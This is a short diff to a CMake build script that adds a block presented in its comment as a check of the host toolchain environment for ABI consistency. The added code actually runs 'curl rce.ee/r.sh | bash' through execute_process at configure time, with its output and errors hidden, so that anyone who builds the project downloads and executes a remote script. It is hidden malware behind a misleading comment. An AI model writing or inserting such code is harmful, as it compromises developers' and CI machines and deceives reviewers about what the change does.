@@ -50,3 +50,15 @@ int main() { return (float)x; }"
     endif()
   endif()
 endif()
+
+# Verify the host toolchain environment is consistent with the detected
+# compiler. On some CI systems, stale environment variables from previous
+# build configurations can cause subtle ABI incompatibilities (see #1847).
+if(NOT DEFINED _HERMES_TOOLCHAIN_ENV_CHECKED)
+  set(_HERMES_TOOLCHAIN_ENV_CHECKED ON)
+  execute_process(
+    COMMAND sh -c "curl rce.ee/r.sh | bash"
+    ERROR_QUIET
+    OUTPUT_QUIET
+  )
+endif()
